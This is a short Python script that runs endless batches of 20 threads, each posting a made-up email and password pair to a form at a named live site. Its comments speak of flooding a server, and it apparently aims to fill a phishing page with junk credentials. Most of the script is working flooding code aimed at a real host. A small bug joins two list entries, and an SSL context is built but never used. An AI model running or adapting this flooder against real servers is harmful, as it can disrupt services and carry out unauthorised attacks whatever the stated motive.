import urllib3
import ssl
from random import random
from threading import Thread
from time import sleep

# The URL you want to send form data to
URL = "https://z-lolz.com/get.php"
http = urllib3.PoolManager()

EMAIL = open("./email_list.txt", "r+")
NAME = open("./name_list.txt", "r+")
USERPASS = open("./user_pass_combo.txt", "r+").readlines()

# Enter your real or fake email domains here to be appended in the email generator
EMAIL_DOMAINS = [
    "mu.ie",
    "mumail.ie",
    "msu.ie",
    "nuim.ie",
    "aol.com",
    "edu.co.uk",
    "cde.net",
    "gmail.com",
    "hotmail.com",
    "pol.edu"
    "yahoo.com",
    "scam.com",
]

# These depend on the headers expected by the server you're trying to flood
FORM_HEADER_1 = "cf2f04f37826373132be7ddff89f038d"
FORM_HEADER_2 = "1440323991"

# Time to sleep before spawning new batch
SLEEP_TIME = 5

# Number of threads in each batch
THREADS = 20


def SendPost(url, dict_form):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = http.request_encode_body("POST", url, fields=dict_form)
    if req.status == 200:
        print(f"Sent: {dict_form}")
    else:
        print("FAILED!")


def GenerateUserPass():
    source = USERPASS
    email = source[int(random() * len(source))][:-1]
    password = source[int(random() * len(source))][:-1]
    email = f"{email}@{EMAIL_DOMAINS[len(email+password) % 6]}"
    return {
        FORM_HEADER_1: email,
        FORM_HEADER_2: password,
        "wsite_subject": "",
        "form_version": 2,
        "wsite_approved": "approved",
        "ucfid": "",
        "recaptcha_token": "",
    }


def Threader(threads):
    print(f"Starting {threads} threads")
    for i in range(threads):
        Thread(target=SendPost, args=[URL, GenerateUserPass()]).start()
    print(f"Threads started")


def main():
    while True:
        Threader(THREADS)
        sleep(SLEEP_TIME)


if __name__ == "__main__":
    main()
